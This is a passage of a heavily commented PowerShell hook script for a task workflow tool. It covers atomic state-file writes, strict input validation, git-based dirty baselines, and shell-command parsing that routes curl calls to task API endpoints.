    # makes reading an unset variable throw, so a failure in New-Item — before
    # $_tmp is assigned — would throw AGAIN inside the catch and propagate out
    # of the function, breaking the never-fatal guarantee on exactly the path
    # the catch exists to absorb. Verified: without this the function throws
    # "The variable '$_tmp' cannot be retrieved because it has not been set."
    $_tmp = $null
    try {
        $_dir = Join-Path $ProjectDir '.stride'
        if (-not (Test-Path -LiteralPath $_dir)) {
            New-Item -ItemType Directory -Force -Path $_dir -ErrorAction Stop | Out-Null
        }
        $_dest = Get-HookResultFile -Hook $Hook
        $_tmp = Join-Path $_dir ("hook-result.{0}.tmp" -f ([System.IO.Path]::GetRandomFileName()))
        [System.IO.File]::WriteAllText($_tmp, $Json + "`n")
        Move-Item -LiteralPath $_tmp -Destination $_dest -Force -ErrorAction Stop
    } catch {
        # Deliberately swallowed — see "never fatal" above.
        if ($_tmp -and (Test-Path -LiteralPath $_tmp)) {
            Remove-Item -LiteralPath $_tmp -Force -ErrorAction SilentlyContinue
        }
    }
}

# (W2123) Loop-state helpers — the PowerShell half of the bash twins
# loop_state_safe / loop_state_payload_ok / write_loop_state /
# record_loop_state_for_completion in stride-hook.sh.
#
# ONE DOCUMENTED DIVERGENCE, on the same axis and for the same reason as the
# env-cache write above (:74-86): stride-hook.sh execs powershell.exe (Windows
# PowerShell 5.1), whose .NET Framework has no File.Move(src, dst, overwrite),
# so `-Force` there is delete-then-move. "Never partial" holds on both hosts —
# a reader sees the complete old file or none — but "never absent" holds only
# on pwsh 7+ and the bash half. That degrades safely here: the gate this file
# feeds reads an absent file as "no completion awaiting a claim", so the window
# costs a missed gate, never a false one.

# Structurally keep response bodies, task free text and credentials out of the
# file: every string that reaches it must first match a conservative charset.
# -cmatch, not -match, so the charset is case-sensitive as written.
#
# \z, NOT $. In .NET, `$` matches at end-of-string OR immediately before a
# trailing newline, so `abc\n` would pass here and be recorded verbatim while
# the bash twin's `case ... *[!A-Za-z0-9_.:-]*` refuses it and degrades it to
# "unknown" — a cross-half divergence in exactly the charset gate whose job is
# to be identical. `\z` matches only at the very end, so the halves agree.
function Test-LoopStateSafe {
    param([string]$Value)
    if (-not $Value) { return $false }
    if ($Value.Length -gt 64) { return $false }
    return ($Value -cmatch '\A[A-Za-z0-9_.:-]+\z')
}

# Strip trailing newlines BEFORE validating, because that is what the bash twin
# unavoidably does: it reads both values through `$( ... )`, and command
# substitution strips every trailing newline. Without this the halves diverge on
# exactly one input — a value ending in "`n" — with bash recording the stripped
# form and PowerShell refusing it as unsafe.
#
# LF ONLY, deliberately: `$( )` strips linefeeds and leaves a carriage return
# behind, which bash's charset glob then refuses. Stripping CRLF here would
# record "abc" for "abc`r`n" where bash records "unknown" — closing the LF
# divergence by opening a CR one. Interior newlines are NOT stripped and both
# halves still refuse them, which is the behaviour that matters: the charset
# gate keeps a response body or a token out either way.
function ConvertTo-LoopStateValue {
    param([string]$Value)
    if ($null -eq $Value) { return '' }
    return ($Value -creplace '\n+\z', '')
}

# A payload describes a SUCCESSFUL completion only when it carries the two
# fields the state file is built from. Every non-success body the API emits
# lacks `.data` entirely, so this is the discriminator between a 2xx and a 422.
# Every property read is guarded: Set-StrictMode -Version Latest (:14) makes
# reading an absent property a terminating error.
function Test-LoopStatePayloadOk {
    param($Payload)
    if ($null -eq $Payload) { return $false }
    if ($Payload -isnot [PSCustomObject]) { return $false }
    if ($Payload.PSObject.Properties.Name -notcontains 'data') { return $false }
    $d = $Payload.data
    if ($null -eq $d -or $d -isnot [PSCustomObject]) { return $false }
    if ($d.PSObject.Properties.Name -notcontains 'identifier') { return $false }
    if ($d.PSObject.Properties.Name -notcontains 'needs_review') { return $false }
    if ($d.identifier -isnot [string] -or -not $d.identifier) { return $false }
    if ($d.needs_review -isnot [bool]) { return $false }
    return $true
}

# Atomic and never fatal, copying Write-HookResult's mechanics exactly: the
# temp is staged in the DESTINATION directory so the move is a rename, a
# failure leaves no temp behind, and nothing throws. $_tmp MUST be initialised
# before the try for the strict-mode reason spelled out in Write-HookResult.
function Write-LoopState {
    param([string]$Json)
    # A move onto a DIRECTORY relocates the temp inside it instead of failing,
    # so the catch never runs: the record lands where no reader looks and the
    # temp survives indefinitely. Refuse any destination that exists and is not
    # a regular file, rather than assuming the move fails when it is unusable.
    if ((Test-Path -LiteralPath $LoopStateFile) -and
        -not (Test-Path -LiteralPath $LoopStateFile -PathType Leaf)) {
        [Console]::Error.WriteLine('stride-hook: loop-state path is not a regular file; not recording')
        return
    }
    $_tmp = $null
    try {
        $_dir = Join-Path $ProjectDir '.stride'
        if (-not (Test-Path -LiteralPath $_dir)) {
            New-Item -ItemType Directory -Force -Path $_dir -ErrorAction Stop | Out-Null
        }
        $_tmp = Join-Path $_dir ("loop-state.{0}.tmp" -f ([System.IO.Path]::GetRandomFileName()))
        [System.IO.File]::WriteAllText($_tmp, $Json + "`n")
        Move-Item -LiteralPath $_tmp -Destination $LoopStateFile -Force -ErrorAction Stop
    } catch {
        # Swallowed — never fatal to the completion — but announced on stderr,
        # so a persistently unwritable .stride/ is visible rather than silent.
        [Console]::Error.WriteLine('stride-hook: could not write the loop state; continuing')
        if ($_tmp -and (Test-Path -LiteralPath $_tmp)) {
            Remove-Item -LiteralPath $_tmp -Force -ErrorAction SilentlyContinue
        }
    }
}

# THIS call's payload only — the mirror of the bash twin's Tier 1, and
# deliberately NOT Get-ResponsePayload, which is canonical-file-first (D118).
# .stride/.last-api-response.json survives across calls, so on a truncated 422
# that helper resolves the previous CLAIM payload — which carries both fields —
# and would record a completion that never happened (the D226 staleness shape).
# There is no ps1 twin of unwrap_tool_response, so the unwrap is inlined here,
# with the same elseif-never-fall-through rule Get-ResponsePayload documents at
# its Shape 1: a truncated stdout MUST resolve to $null, not to the wrapper.
# The RAW body of this call, before any parse — so the unparsable diagnostic can
# distinguish "no body at all" from "a body that failed to parse". Get-OwnCallPayload
# returns $null for four different reasons and only one of them is a parse failure,
# so it cannot be used to decide that question.
function Get-OwnCallRawBody {
    param([string]$InputJson)
    if (-not $InputJson) { return '' }
    try { $parsed = $InputJson | ConvertFrom-Json } catch { return '' }
    if ($null -eq $parsed) { return '' }
    if ($parsed.PSObject.Properties.Name -notcontains 'tool_response') { return '' }
    $resp = $parsed.tool_response
    if (-not $resp) { return '' }
    if ($resp -is [PSCustomObject] -and $resp.PSObject.Properties.Name -contains 'stdout') {
        return [string]$resp.stdout
    } elseif ($resp -is [string]) {
        return $resp
    }
    return ''
}

function Get-OwnCallPayload {
    param([string]$InputJson)
    if (-not $InputJson) { return $null }
    try { $parsed = $InputJson | ConvertFrom-Json } catch { return $null }
    if ($null -eq $parsed) { return $null }
    if ($parsed.PSObject.Properties.Name -notcontains 'tool_response') { return $null }
    $resp = $parsed.tool_response
    if (-not $resp) { return $null }
    if ($resp -is [PSCustomObject] -and $resp.PSObject.Properties.Name -contains 'stdout') {
        try { return ($resp.stdout | ConvertFrom-Json) } catch { return $null }
    } elseif ($resp -is [string]) {
        try { return ($resp | ConvertFrom-Json) } catch { return $null }
    } elseif ($resp -is [PSCustomObject]) {
        return $resp
    }
    return $null
}

# Self-gates on before_review — the hook that fires AFTER a /complete succeeds.
# Never writes to the stdout stream: this script emits exactly one JSON
# document, so any diagnostic would corrupt it.
function Write-LoopStateForCompletion {
    param([string]$InputJson, $ResponsePayload)

    if ($HookName -cne 'before_review') { return }

    $src = $null
    $own = Get-OwnCallPayload -InputJson $InputJson
    if (Test-LoopStatePayloadOk -Payload $own) {
        $src = $own
    } elseif (Test-LoopStatePayloadOk -Payload $ResponsePayload) {
        # Tier 2 — the harness truncated a large SUCCESS, so this call's own
        # stdout will not parse. Fall back to the canonical snapshot, but only
        # when it demonstrably belongs to THIS completion: `hooks` is an array
        # (a claim carries singular `hook`) and its task id equals the id this
        # command routed on. Both guards must hold, or the D226 staleness walks
        # back in through the fallback.
        #
        # WHY THE SNAPSHOT HOLDS THIS COMPLETION AND NOT THE LAST CLAIM — state
        # it, because omitting it has already led two readers to opposite wrong
        # conclusions: one that this block is unreachable dead weight, the
        # other that the "saved to" persisted-output branch covers the case
        # instead. Neither is right. The completion curl is REQUIRED to end in
        # `| tee .stride/.last-api-response.json` (the W2131 pre-phase guard
        # refuses it otherwise) and Save-CanonicalResponse writes the same
        # file, so the snapshot carries THIS response, untruncated. The
        # "saved to" branch cannot substitute: Read-CanonicalResponse runs
        # FIRST inside Get-ResponsePayload, so a non-empty snapshot preempts
        # it. Tier 2 is the only path that records anything on a
        # harness-truncated large success.
        $routeId = ''
        if ($StrideRoute -and $StrideRoute.PSObject.Properties.Name -contains 'TaskId') {
            $routeId = [string]$StrideRoute.TaskId
        }
        $hasHooksArray = ($ResponsePayload.PSObject.Properties.Name -contains 'hooks') -and
                         ($ResponsePayload.hooks -is [System.Collections.IEnumerable]) -and
                         ($ResponsePayload.hooks -isnot [string])
        $idMatches = $false
        if ($ResponsePayload.data.PSObject.Properties.Name -contains 'id') {
            $idMatches = ([string]$ResponsePayload.data.id -ceq $routeId)
        }
        if ($routeId -and $hasHooksArray -and $idMatches) { $src = $ResponsePayload }
    }
    if ($null -eq $src) {
        # A 422 legitimately records nothing, and announcing every failed
        # completion would be noise. An UNPARSABLE body is the different case:
        # the completion may well have succeeded server-side and the evidence
        # is simply lost, indistinguishable from "nothing to record" unless
        # said.
        #
        # Decided by an actual PARSE, never by `$null -eq $own`: that would be
        # true for four distinct reasons — no input, no tool_response, an empty
        # tool_response, an unrecognised shape — of which only one is a parse
        # failure, so an ABSENT body would be announced as one that failed to
        # parse. A body of `false` or `null` parses fine and stays quiet, which
        # is what the bash twin's `jq empty` also does.
        $rawOwn = Get-OwnCallRawBody -InputJson $InputJson
        if ($rawOwn) {
            $ownParsed = $true
            try { $null = $rawOwn | ConvertFrom-Json } catch { $ownParsed = $false }
            if (-not $ownParsed) {
                [Console]::Error.WriteLine('stride-hook: completion response was unparsable; no loop state recorded')
            }
        }
        return
    }

    $ident = ConvertTo-LoopStateValue -Value ([string]$src.data.identifier)
    if (-not (Test-LoopStateSafe -Value $ident)) { return }

    # The session id is the ONLY field read out of the hook input, which also
    # carries the Bearer token in tool_input.command — never widen this read.
    $sid = ''
    try {
        $parsed = $InputJson | ConvertFrom-Json
        if ($parsed -and $parsed.PSObject.Properties.Name -contains 'session_id') {
            $sid = [string]$parsed.session_id
        }
    } catch { $sid = '' }
    if (-not $sid) { $sid = [string]$env:CLAUDE_SESSION_ID }
    $sid = ConvertTo-LoopStateValue -Value $sid
    if (-not (Test-LoopStateSafe -Value $sid)) { $sid = 'unknown' }

    $obj = [ordered]@{
        identifier   = $ident
        needs_review = [bool]$src.data.needs_review
        completed_at = (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ')
        session_id   = $sid
    }
    try {
        $json = $obj | ConvertTo-Json -Compress -Depth 4
    } catch {
        return
    }
    Write-LoopState -Json $json
}

# (W1453) Keys exported with an empty value. .NET's SetEnvironmentVariable
# DELETES a Process env var when handed '', so the defined-but-empty contract
# (hook-execution.md: omitted keys export as empty strings, preventing
# ${VAR?} / set -u aborts in user commands) cannot be represented in the
# process env block alone. Invoke-StrideSection re-adds these keys as
# KEY='' entries on each section child's environment.
$StrideEmptyEnvKeys = @()

# (W1457) Record the claim-time dirty baseline: every path already modified
# (vs the fresh TASK_BASE_REF) or untracked at claim time, with its current
# blob hash, one "<hash> <path>" line each. The upload filter consults this
# to exclude pre-existing unrelated edits from completion snapshots unless
# the file changed again after claim (hash differs -> included). Persisted
# on disk (claim and completion can happen in different sessions), cleaned
# up with the other hook artifacts. Best-effort: failure leaves an absent
# baseline, which the filter treats as "no exclusion".
function Write-DirtyBaseline {
    param([string]$BaseRef)
    $blFile = Join-Path $ProjectDir '.stride-dirty-baseline'
    Remove-Item -Force $blFile -ErrorAction SilentlyContinue
    if (-not $BaseRef) { return }
    try {
        # (D286) -z on BOTH listings, matching Build-ChangedFilesSnapshot and the
        # bash twin's record_dirty_baseline. Without it git returns the
        # octal-escaped display spelling for any path holding a byte >= 0x80
        # (core.quotePath, default true), so the baseline was keyed on a spelling
        # the snapshot never produces — it lists with -z and records the RAW
        # path. The two could never match for a non-ASCII path, which made the
        # W1457 pre-existing-edit filter silently INERT for exactly those files,
        # on Windows only. The failure direction is over-report, which is why
        # nothing broke loudly; it was still a divergence between the executors,
        # and D278 fixed the bash half while this one was left behind.
        #
        # The quoted spelling also defeated the hash, and the sentinel it
        # produced is 'absent', NOT 'unhashable' — the quoted path fails the
        # Test-Path below, so git hash-object is never reached.
        #
        # The hash column is not, however, what decided the outcome pre-fix, and
        # an earlier version of this comment claimed it was. The baseline was
        # KEYED on the quoted spelling including its surrounding double quotes
        # (`absent "\303\251clair.txt"` is the whole line, measured), so the
        # filter's lookup against the raw capture path missed and the entry was
        # never found at all. The path was then included by the no-baseline-entry
        # default, not by a hash comparison that failed — the hash column was
        # never consulted. Same outcome, different mechanism, and the mechanism
        # is the part a reader would act on.
        #
        # Two different correct patterns, because the two git reads differ:
        # `diff` goes through Invoke-GitCapture's byte-exact --output file read,
        # while `ls-files` has no --output and must pin [Console]::OutputEncoding
        # for the duration of the call. That asymmetry is not stylistic — see the
        # long note above the ls-files call in Build-ChangedFilesSnapshot.
        #
        # ONE NEW DEPENDENCY, recorded rather than worked around: routing the
        # tracked listing through Invoke-GitCapture makes this function depend on
        # $ProjectDir/.stride being creatable, because that helper reports a
        # failure rather than falling back to system temp. Where it is not, the
        # ps1 baseline loses its TRACKED half while the bash twin, which shells
        # out directly, keeps it — a small asymmetry in the pair this change
        # exists to keep in step. The direction is over-report, and the
        # completion-side snapshot degrades the same way under the same
        # conditions, so the practical impact is close to nil.
        $tracked = @(Split-NulList (Get-GitDiffBody -GitArgs @('diff', '--name-only', '-z', $BaseRef)))
        $prevOutEnc = [Console]::OutputEncoding
        $untrackedRaw = ''
        try {
            try { [Console]::OutputEncoding = New-Object System.Text.UTF8Encoding($false) } catch { }
            $untrackedRaw = (& git -C $ProjectDir ls-files -z --others --exclude-standard 2>$null | Out-String)
            if ($LASTEXITCODE -ne 0) { $untrackedRaw = '' }
        } finally {
            try { [Console]::OutputEncoding = $prevOutEnc } catch { }
        }
        # TrimEnd the newline Out-String appends, or the trailing NUL is followed
        # by a bare CRLF that Split-NulList emits as a phantom entry — the same
        # trap the snapshot's own ls-files read documents.
        $untracked = @(Split-NulList ($untrackedRaw.TrimEnd("`r", "`n")))
        $paths = @(($tracked + $untracked) | Where-Object { $_ } | Select-Object -Unique)
        if ($paths.Count -eq 0) { return }
        $lines = @()
        foreach ($p in $paths) {
            $full = Join-Path $ProjectDir $p
            if (Test-Path -LiteralPath $full -PathType Leaf) {
                $h = (& git -C $ProjectDir hash-object -- $p 2>$null | Out-String).Trim()
                if ($LASTEXITCODE -ne 0 -or -not $h) { $h = 'unhashable' }
            } else {
                $h = 'absent'
            }
            $lines += "$h $p"
        }
        Set-Content -Path $blFile -Value $lines -Encoding UTF8
    } catch {
        # Best-effort — an absent baseline just means no exclusion.
    }
}

# (W1457) Load the dirty baseline as a path->hash map; $null when absent.
function Read-DirtyBaseline {
    $blFile = Join-Path $ProjectDir '.stride-dirty-baseline'
    if (-not (Test-Path -LiteralPath $blFile -PathType Leaf)) { return $null }
    $map = @{}
    try {
        foreach ($line in Get-Content -Path $blFile -Encoding UTF8) {
            if ($line -match '^(\S+) (.+)$') { $map[$Matches[2]] = $Matches[1] }
        }
    } catch {
        return $null
    }
    if ($map.Count -eq 0) { return $null }
    return $map
}

# (D118) Read the canonical API-response snapshot. Returns the parsed object
# when the file exists and holds valid JSON, else $null so callers fall back to
# the tool_response parse. Defined ahead of the claim env-cache block and
# Get-ResponsePayload so both can prefer the file. Best-effort fast path — the
# reliability guarantee is D119's hook-initiated fresh call.
function Read-CanonicalResponse {
    if (-not $ResponseFile) { return $null }
    if (-not (Test-Path -LiteralPath $ResponseFile -PathType Leaf)) { return $null }
    $content = $null
    try { $content = Get-Content -LiteralPath $ResponseFile -Raw -ErrorAction Stop } catch { return $null }
    if (-not $content) { return $null }
    try { return ($content | ConvertFrom-Json) } catch { return $null }
}

# (W1609) Capture THIS call's API response to the canonical file so the file-
# first resolver and the claim env-cache refresh read the CURRENT call's data
# rather than a stale prior-call file. Only complete, valid JSON is written — a
# truncated stdout leaves any out-of-band copy intact so a value written by a
# curl passthrough (or a later phase) survives. Best-effort; never throws.
function Save-CanonicalResponse {
    param([string]$InputJson)
    if (-not $ResponseFile) { return }
    if (-not $InputJson) { return }
    $parsed = $null
    try { $parsed = $InputJson | ConvertFrom-Json } catch { return }
    if ($null -eq $parsed) { return }
    if ($parsed.PSObject.Properties.Name -notcontains 'tool_response') { return }
    $resp = $parsed.tool_response
    if (-not $resp) { return }

    $payloadStr = $null
    if ($resp -is [PSCustomObject] -and $resp.PSObject.Properties.Name -contains 'stdout') {
        $payloadStr = [string]$resp.stdout
    } elseif ($resp -is [string]) {
        $payloadStr = $resp
    } elseif ($resp -is [PSCustomObject]) {
        try { $payloadStr = ($resp | ConvertTo-Json -Depth 100 -Compress) } catch { return }
    }
    if (-not $payloadStr) { return }
    # A truncated blob must never overwrite a good file — only persist valid JSON.
    try { $null = $payloadStr | ConvertFrom-Json } catch { return }

    try {
        $dir = Split-Path -Parent $ResponseFile
        if ($dir -and -not (Test-Path -LiteralPath $dir)) {
            New-Item -ItemType Directory -Force -Path $dir | Out-Null
        }
        Set-Content -LiteralPath $ResponseFile -Value $payloadStr -NoNewline -Encoding UTF8
    } catch {
        # Best-effort — an unwritten file just falls back to the stdout parse.
    }
}

# --- Bash-command routing (D220) ---
# Decision-identical mirror of stride-hook.sh's stride_route_command and its
# _stride_* helpers. THE COMMAND TEXT IS UNTRUSTED ROUTING INPUT: a changed_files
# PUT carries a raw code diff, and a heredoc writing documentation can contain
# the completion curl verbatim, so containment is not evidence of issuance.
# Requires (1) curl/wget in command position outside quotes and heredoc bodies,
# (2) the endpoint as the TAIL of a URL in an ARGUMENT position, (3) a method
# consistent with the endpoint. Fails closed: anything unparseable routes
# nowhere, because running the wrong section runs real git state changes while
# running none only misses a gate.
# THESE TWO FILES MUST STAY IN LOCKSTEP — see hooks/stride-hook.sh.

$script:StrideQuoteState = ''
$script:StrideQuoteRest  = ''

# Advance the quote state ('' | sq | dq) across $Text. With -StopWhenClosed,
# stop as soon as the state returns to '' and leave the remainder in
# $script:StrideQuoteRest.
#
# Backslash escapes ARE modelled, and must be: outside single quotes a backslash
# escapes the next character, so a JSON payload's \" does NOT close the enclosing
# double quote. Ignoring that flips the tracker OUT of quoting on an odd number
# of \" and lets payload text be scanned as syntax — a FAIL-OPEN bug.
function Update-StrideQuoteState {
    param([string]$Text, [switch]$StopWhenClosed)
    $script:StrideQuoteRest = ''
    if ($Text.IndexOf("'") -lt 0 -and $Text.IndexOf('"') -lt 0 -and $Text.IndexOf('\') -lt 0) { return }
    # Index of the character most recently consumed AS an escape. The aq test
    # below must not treat an escaped `\$` as introducing ANSI-C quoting — bash
    # reads `\$'a\'b` as a literal dollar followed by a PLAIN single-quoted
    # string, so the `\'` closes it. The sh mirror gets this right for free
    # because it consumes the escaped character before testing the prefix.
    $escapedAt = -1
    for ($i = 0; $i -lt $Text.Length; $i++) {
        $c = $Text[$i]
        if ($c -eq '\') {
            # No escapes inside plain single quotes; everywhere else \x makes x literal.
            if ($script:StrideQuoteState -cne 'sq') { $escapedAt = $i + 1; $i++ }
            continue
        }
        if ($c -ne '"' -and $c -ne "'") { continue }
        if ($script:StrideQuoteState -ceq '') {
            if ($c -eq "'") {
                # $'...' is ANSI-C quoting, where \' does NOT close the string.
                $script:StrideQuoteState = if ($i -gt 0 -and $Text[$i - 1] -eq '$' -and ($i - 1) -ne $escapedAt) { 'aq' } else { 'sq' }
            } else {
                $script:StrideQuoteState = 'dq'
            }
        } elseif ($script:StrideQuoteState -ceq 'sq' -or $script:StrideQuoteState -ceq 'aq') {
            if ($c -eq "'") { $script:StrideQuoteState = '' }
        } else {
            if ($c -eq '"') { $script:StrideQuoteState = '' }
        }
        if ($StopWhenClosed -and $script:StrideQuoteState -ceq '') {
            $script:StrideQuoteRest = $Text.Substring($i + 1)
            return
        }
    }
}

# Return $CommandText with every heredoc BODY removed. The opening line is KEPT
# (a curl can legitimately read its payload from `-d @- <<'JSON'`). This is what
# stops an agent writing documentation ABOUT the completion curl from being
# routed as one.
# Apply bash's quote removal to a heredoc delimiter word. NOT a delete-all-quotes
# reduction: bash KEEPS what a backslash escapes and KEEPS quoted contents, so
# `E\'F` is the delimiter E'F. Deleting them yields a SHORTER word, and if that
# shorter word appears in the body before bash's real terminator the queue
# dequeues early and the rest of the body is scanned as syntax. `''` and `""`
# still reduce to the empty string, preserving the first-empty-line rule.
function Get-StrideHeredocDelim {
    param([string]$Word)
    $o = New-Object System.Text.StringBuilder
    $state = ''
    $any = $false
    $unsafe = $false
    $stop = @(' ', "`t", ';', '|', '&', '(', ')', '<', '>')
    $i = 0
    for (; $i -lt $Word.Length; $i++) {
        $c = $Word[$i]
        if ($state -ceq 'sq') {
            if ($c -eq "'") { $state = '' } else { [void]$o.Append($c) }
            continue
        }
        if ($state -ceq 'aq') {
            if ($c -eq "'") { $state = '' }
            elseif ($c -eq '\') {
                # Inside $'…' bash INTERPRETS escapes (\n is a newline, \x41 is
                # A). We do not implement that table; for \' \" \\ the ANSI-C
                # meaning IS the next character, so those agree. Anything else
                # would render SHORTER than bash's delimiter and dequeue the body
                # early — mark it unsafe so it never terminates instead.
                if ($i + 1 -lt $Word.Length) {
                    $i++
                    $n = $Word[$i]
                    if ($n -ne "'" -and $n -ne '"' -and $n -ne '\') { $unsafe = $true }
                    [void]$o.Append($n)
                }
            }
            else { [void]$o.Append($c) }
            continue
        }
        if ($state -ceq 'dq') {
            if ($c -eq '"') { $state = '' }
            elseif ($c -eq '\') {
                # Inside " " bash removes the backslash ONLY before $ ` " \ .
                $n = if ($i + 1 -lt $Word.Length) { $Word[$i + 1] } else { [char]0 }
                if ($n -eq '$' -or $n -eq '`' -or $n -eq '"' -or $n -eq '\') {
                    $i++; [void]$o.Append($n)
                } else { [void]$o.Append('\') }
            }
            else { [void]$o.Append($c) }
            continue
        }
        if ($stop -ccontains [string]$c) { break }
        $any = $true
        if ($c -eq '\') { if ($i + 1 -lt $Word.Length) { $i++; [void]$o.Append($Word[$i]) }; continue }
        if ($c -eq "'") { $state = 'sq'; continue }
        if ($c -eq '"') { $state = 'dq'; continue }
        if ($c -eq '$') {
            $n = if ($i + 1 -lt $Word.Length) { $Word[$i + 1] } else { [char]0 }
            if ($n -eq "'") { $state = 'aq'; $i++; continue }
            if ($n -eq '"') { $state = 'dq'; $i++; continue }
            [void]$o.Append('$'); continue
        }
        [void]$o.Append($c)
    }
    return [pscustomobject]@{ Delim = $o.ToString(); Any = $any; Unsafe = $unsafe; Consumed = $i }
}

function Remove-StrideHeredocBodies {
    param([string]$CommandText)
    $out = New-Object System.Collections.Generic.List[string]
    # FIFO of pending openers, not a single value: bash allows several on one
    # line and consumes their bodies in order.
    $queue = New-Object System.Collections.Generic.Queue[object]
    # Quote state carried across lines, so a `<<` inside a string is not read as
    # an opener. Saved/restored because Get-StrideRoute uses the same tracker.
    $savedQ = $script:StrideQuoteState
    $script:StrideQuoteState = ''
    foreach ($line in [regex]::Split($CommandText, "\r?\n")) {
        if ($queue.Count -gt 0) {
            $head = $queue.Peek()
            # An Unsafe delimiter is one we could not derive exactly (ANSI-C
            # escapes we do not interpret). It never matches, so the body is
            # swallowed to EOF — fail-closed, rather than dequeuing early on a
            # rendering that is not bash's.
            if ($head.Unsafe) { continue }
            # bash strips only TABS for <<- ; stripping spaces too would let a
            # space-indented lookalike end the body early for us but not for bash.
            $t = if ($head.Dash) { $line.TrimStart("`t".ToCharArray()) } else { $line }
            if ($t -ceq $head.Delim) { [void]$queue.Dequeue() }
            continue
        }
        $out.Add($line)
        # Walk the line left to right: `<<<` is a here-string that must skip only
        # ITSELF, every opener on the line must be registered, and a `<<` inside
        # a quoted string is text rather than a redirection.
        $pos = 0
        foreach ($m in [regex]::Matches($line, '<<(<?)(-?)[ \t]*')) {
            if ($m.Index -lt $pos) { continue }
            Update-StrideQuoteState -Text $line.Substring($pos, $m.Index - $pos)
            $pos = $m.Index + 2
            if ($script:StrideQuoteState -cne '') { continue }
            if ($m.Groups[1].Value -ceq '<') { continue }   # here-string
            $w = Get-StrideHeredocDelim $line.Substring($m.Index + $m.Length)
            # Guard on "a word was present": `<<''` and `<<""` are valid heredocs
            # whose body ends at the first EMPTY line.
            if (-not $w.Any) { continue }
            [void]$queue.Enqueue([pscustomobject]@{
                Dash = ($m.Groups[2].Value -ceq '-'); Delim = $w.Delim; Unsafe = $w.Unsafe })
            $pos = $m.Index + $m.Length + $w.Consumed
        }
        if ($pos -lt $line.Length) { Update-StrideQuoteState -Text $line.Substring($pos) }
    }
    $script:StrideQuoteState = $savedQ
    return ($out -join "`n")
}

# A fresh shell segment: new command position, no client, no URL yet.
function New-StrideSegment {
    return @{ Pos = $true; Client = ''; Method = ''; Implied = '';
              Endpoint = ''; TaskId = ''; UrlSeen = $false; Next = '' }
}

# Classify a candidate URL ARGUMENT. Only the FIRST argument-position token
# containing /api/tasks/ is considered (curl's own request-URL semantic), so a
# later bare word inside a payload can neither override nor supply a target. The
# endpoint must be the TAIL of the path, which is why a completion URL embedded
# in a JSON value is not a request target.
function Set-StrideSegmentUrl {
    param($Seg, [string]$Token, $Vars)
    if ($Seg.UrlSeen) { return }
    $u = $Token.TrimStart('"', "'", '\', '(').TrimEnd('"', "'", '\', ',', ';', ')', '`')
    # (D220) Pitfall 2 — the URL "may be written in a shell variable rather than
    # as a literal". `URL="$STRIDE_API_URL/api/tasks/$TASK_ID/complete"; curl -X
    # PATCH "$URL"` routed before this change and must keep routing.
    if ($u.StartsWith('$')) {
        $n = $u.Substring(1)
        if ($n.StartsWith('{')) { $n = $n.Substring(1) }
        if ($n.EndsWith('}'))   { $n = $n.Substring(0, $n.Length - 1) }
        if ($n -cmatch '^[A-Za-z0-9_]+$' -and $Vars.ContainsKey($n)) { $u = $Vars[$n] }
    }
    if ($u -cnotlike '*/api/tasks/*') { return }
    $Seg.UrlSeen = $true
    $u = ($u -split '\?')[0]
    $u = ($u -split '#')[0]
    # Strip ONE trailing slash, as the sh mirror's ${u%/} does.
    if ($u.EndsWith('/')) { $u = $u.Substring(0, $u.Length - 1) }
    $i = $u.IndexOf('/api/tasks/')
    $rest = $u.Substring($i + '/api/tasks/'.Length)
    if ($rest -ceq 'claim') { $Seg.Endpoint = 'claim'; $Seg.TaskId = ''; return }
    $slash = $rest.IndexOf('/')
    if ($slash -lt 0) { return }
    $id  = $rest.Substring(0, $slash)
    $act = $rest.Substring($slash + 1)
    if ($act -cne 'complete' -and $act -cne 'mark_reviewed') { return }
    if ($id -ceq '') { return }
    $Seg.Endpoint = $act
    # (D127) Only a NUMERIC id is authoritative; $TASK_ID interpolation leaves it
    # empty and callers fall back to the env cache, exactly as before D220.
    $Seg.TaskId = if ($id -cmatch '^[0-9]+$') { $id } else { '' }
}

# Record NAME=VALUE seen in command position, but only when VALUE names the API.
function Add-StrideVar {
    param($Vars, [string]$Token)
    $n = $Token.Substring(0, $Token.IndexOf('='))
    if ($n -cnotmatch '^[A-Za-z_][A-Za-z0-9_]*$') { return }
    # A SECOND assignment to the same name means the effective value depends on
    # control flow we do not evaluate — store an empty sentinel so the lookup
    # declines to resolve rather than guessing which branch bash took. EVERY name
    # is recorded, even when its value does not name the API, so the sentinel is
    # order-INDEPENDENT (recording only API-valued names missed the common
    # `if $DRY; then URL=noop; else URL=…/complete; fi` ordering).
    if ($Vars.ContainsKey($n)) { $Vars[$n] = ''; return }
    $v = $Token.Substring($Token.IndexOf('=') + 1).Trim('"', "'", ';')
    if ($v -cnotlike '*/api/tasks/*') { $v = '' }
    $Vars[$n] = $v
}

# Decide whether the accumulated segment is a real lifecycle call.
function Test-StrideSegment {
    param($Seg)
    if ($Seg.Client -ceq '' -or $Seg.Endpoint -ceq '') { return $null }
    $m = $Seg.Method
    if ($m -ceq '') { $m = $Seg.Implied }
    if ($m -ceq '') { $m = 'GET' }
    $m = ($m -replace '["'']', '').ToUpperInvariant()
    # -X "$METHOD" cannot be resolved statically. Allow it — a silent non-firing
    # after_doing removes the quality gate entirely — but only when the call also
    # carries a BODY, which every documented lifecycle curl does and a read-only
    # probe of the same URL does not.
    if ($m -ceq '' -or $m.Contains('$') -or $m.Contains('`')) {
        $m = if ($Seg.Implied -cne '') { 'UNKNOWN' } else { 'GET' }
    }
    if ($Seg.Endpoint -ceq 'claim') {
        if ($m -cne 'POST' -and $m -cne 'UNKNOWN') { return $null }
    } else {
        if ($m -cne 'PATCH' -and $m -cne 'POST' -and $m -cne 'UNKNOWN') { return $null }
    }
    return [pscustomobject]@{ Endpoint = $Seg.Endpoint; TaskId = $Seg.TaskId }
}

# THE single routing entry point (D220). $Phase is pre|post ('' for an id-only
# query). Returns Endpoint / HookName / TaskId; all routing sites read it, so
# they cannot drift apart.
function Get-StrideRoute {
    param([string]$Phase, [string]$CommandText)

    $route = [pscustomobject]@{ Endpoint = ''; HookName = ''; TaskId = '' }
    # Fast path: the overwhelming majority of Bash calls never mention the API.
    if (-not $CommandText -or ($CommandText -cnotlike '*/api/tasks/*')) { return $route }

    $script:StrideQuoteState = ''
    $seg  = New-StrideSegment
    $hit  = $null
    $pend = ''
    # Ordinal comparer, NOT a bare @{}: PowerShell hashtables match keys
    # case-insensitively, which would resolve $url against a URL= assignment that
    # bash would never resolve — a fail-open divergence from the sh mirror.
    $vars = [System.Collections.Generic.Dictionary[string,string]]::new([System.StringComparer]::Ordinal)
